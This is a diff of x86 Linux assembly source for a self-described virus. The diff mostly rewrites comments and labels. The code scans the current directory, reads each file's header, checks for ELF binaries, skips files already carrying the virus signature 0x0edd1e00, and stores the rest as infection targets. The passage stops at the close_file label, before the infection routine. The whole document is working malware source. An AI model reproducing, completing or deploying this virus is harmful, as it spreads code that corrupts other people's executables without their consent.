@@ -1,132 +1,137 @@
-;; nasm -f elf -F dwarf -g cranky_data_virus.asm
-;; ld -m elf_i386 -e v_start -o cranky_data_virus cranky_data_virus.o
-
 section .text
     global v_start
 
-v_start:
-    ; virus body start
+v_start:                    ; start of virus
 
-    ; make space in the stack for some uninitialized variables to avoid a .bss section
-    mov ecx, 2328   ; set counter to 2328 (x4 = 9312 bytes). filename (esp), buffer (esp+32), targets (esp+1056), targetfile (esp+2080)
-loop_bss:
-    push 0x00       ; reserve 4 bytes (double word) of 0's
-    sub ecx, 1      ; decrement our counter by 1
+    ; reserve some space(we don't want to have .bss section)
+    mov ecx, 2328
+
+    ;reserve 2328 * 4 bytes
+    ;esp        -> file_name
+    ;esp + 32   -> buffer
+    ;esp + 1056 -> space for store suitable elf files
+    ;esp + 2080 -> space for load target_file
+reserve_space_loop:
+    push 0x00               ; reserve a double word
+    sub ecx, 1
     cmp ecx, 0
-    jbe loop_bss
-    mov edi, esp    ; esp has our fake .bss offset.  Let's store it in edi for now.
+    jbe reserve_space_loop
+    mov edi, esp            ; store esp(our reserved space pointer in edi)
 
-    call folder
-    db ".", 0
-folder:
-    pop ebx         ; name of the folder
-    mov esi, 0      ; reset offset for targets
-    mov eax, 5      ; sys_open
+    call scan_folder
+    db ".", 0               ; name of the current folder
+
+scan_folder:
+    pop ebx                 ; name of the folder
+
+    mov esi, 0              ; reset offset for targets
+    
+    mov eax, 5              ; sys_open
     mov ecx, 0
     mov edx, 0
     int 80h
 
-    cmp eax, 0      ; check if fd in eax > 0 (ok)
-    jbe v_stop        ; cannot open file.  Exit virus
+    cmp eax, 0              ; if fd in eax > 0 then it's ok
+    jbe v_stop              ; error: cannot fetch dir contents
 
     mov ebx, eax
-    mov eax, 0xdc   ; sys_getdents64
-    mov ecx, edi    ; fake .bss section
-    add ecx, 32     ; offset for buffer
+    mov eax, 0xdc           ; sys_getdents64
+    mov ecx, edi            ; fake .bss section
+    add ecx, 32             ; offset for buffer
     mov edx, 1024
     int 80h
 
-    mov eax, 6  ; close
+    mov eax, 6              ; close opened folder
     int 80h
-    xor ebx, ebx    ; zero out ebx as we will use it as the buffer offset
+    
+    xor ebx, ebx            ; zero out ebx as we will use it as the buffer offset
 
 find_filename_start:
-    ; look for the sequence 0008 which occurs before the start of a filename
+    ; look for the sequence 0008 (occurs before the start of a filename)
     inc ebx
     cmp ebx, 1024
     jge infect
-    cmp byte [edi+32+ebx], 0x00     ; edi+32 is buffer
+    cmp byte [edi+32+ebx], 0x00
     jnz find_filename_start
     inc ebx
-    cmp byte [edi+32+ebx], 0x08     ; edi+32 is buffer
+    cmp byte [edi+32+ebx], 0x08
     jnz find_filename_start
 
-    xor ecx, ecx    ; clear out ecx which will be our offset for file
-    mov byte [edi+ecx], 0x2e   ; prepend file with ./ for full path (.)  edi is filename
+    xor ecx, ecx
+    mov byte [edi+ecx], 0x2e   ; prepend file with '.'
     inc ecx
-    mov byte [edi+ecx], 0x2f   ; prepend file with ./ for full path (/)  edi is filename
+    mov byte [edi+ecx], 0x2f   ; prepend file with '/'
     inc ecx
 
 find_filename_end:
-    ; look for the 00 which denotes the end of a filename
+    ; look for the 00 (denotes the end of a filename)
     inc ebx
     cmp ebx, 1024
     jge infect
 
-    push esi                ; save our target offset
-    mov esi, edi            ; fake .bss
-    add esi, 32             ; offset for buffer
-    add esi, ebx            ; set source
-    push edi                ; save our fake .bss
-    add edi, ecx            ; set destination to filename
-    movsb                   ; moved byte from buffer to filename
-    pop edi                 ; restore our fake .bss
-    pop esi                 ; restore our target offset
-    inc ecx                 ; increment offset stored in ecx
+    push esi
+    mov esi, edi
+    add esi, 32
+    add esi, ebx
+    push edi
+    add edi, ecx
+    movsb
+    pop edi
+    pop esi
+    inc ecx
 
-    cmp byte [edi+32+ebx], 0x00 ; denotes end of the filename
+    cmp byte [edi+32+ebx], 0x00
     jnz find_filename_end
 
-    mov byte [edi+ecx], 0x00 ; we have a filename. Add a 0x00 to the end of the file buffer
+    mov byte [edi+ecx], 0x00
 
-    push ebx                ; save our offset in buffer
+    push ebx
     call scan_file
-    pop ebx                 ; restore our offset in buffer
+    pop ebx
 
-    jmp find_filename_start ; find next file
+    jmp find_filename_start
 
 scan_file:
     ; check the file for infectability
     mov eax, 5      ; sys_open
-    mov ebx, edi    ; path (offset to filename)
+    mov ebx, edi    ; edi -> file_name (./foo.x)
     mov ecx, 0      ; O_RDONLY
     int 80h
 
-    cmp eax, 0      ; check if fd in eax > 0 (ok)
+    cmp eax, 0      ; check if eax > 0 (fd exists)
     jbe return      ; cannot open file.  Return
 
-    mov ebx, eax    ; fd
+    mov ebx, eax
     mov eax, 3      ; sys_read
-    mov ecx, edi    ; address struct
-    add ecx, 2080   ; offset to targetfile in fake .bss
-    mov edx, 12     ; all we need are 4 bytes to check for the ELF header but 12 bytes to find signature
+    mov ecx, edi
+    add ecx, 2080   ; edi + 2080 -> target_file
+    mov edx, 12     ; for now we need first 12 bytes
     int 80h
 
     call elfheader
-    dd 0x464c457f     ; 0x7f454c46 -> .ELF (but reversed for endianness)
+    dd 0x464c457f     ; 0x7f454c46 -> .ELF (but reversed)
 elfheader:
     pop ecx
     mov ecx, dword [ecx]
-    cmp dword [edi+2080], ecx ; this 4 byte header indicates ELF! (dword).  edi+2080 is offset to targetfile in fake .bss
-    jnz close_file  ; not an executable ELF binary.  Return
+    cmp dword [edi+2080], ecx ; check if the file is an elf file
+    jnz close_file
 
     ; check if infected
-    mov ecx, 0x001edd0e     ; 0x0edd1e00 signature reversed for endianness
-    cmp dword [edi+2080+8], ecx   ; signature should show up after the 8th byte.  edi+2080 is offset to targetfile in fake .bss
-    jz close_file                   ; signature exists.  Already infected.  Close file.
+    mov ecx, 0x001edd0e
+    cmp dword [edi+2080+8], ecx
+    jz close_file
 
 save_target:
-    ; good target!  save filename
-    push esi    ; save our targets offset
-    push edi    ; save our fake .bss
-    mov ecx, edi    ; temporarily place filename offset in ecx
-    add edi, 1056   ; offset to targets in fake .bss
+    push esi
+    push edi
+    mov ecx, edi
+    add edi, 1056
     add edi, esi
-    mov esi, ecx    ; filename -> edi -> ecx -> esi
+    mov esi, ecx
     mov ecx, 32
-    rep movsb   ; save another target filename in targets
-    pop edi     ; restore our fake .bss
-    pop esi     ; restore our targets offset
+    rep movsb
+    pop edi
+    pop esi
     add esi, 32
 
 close_file:
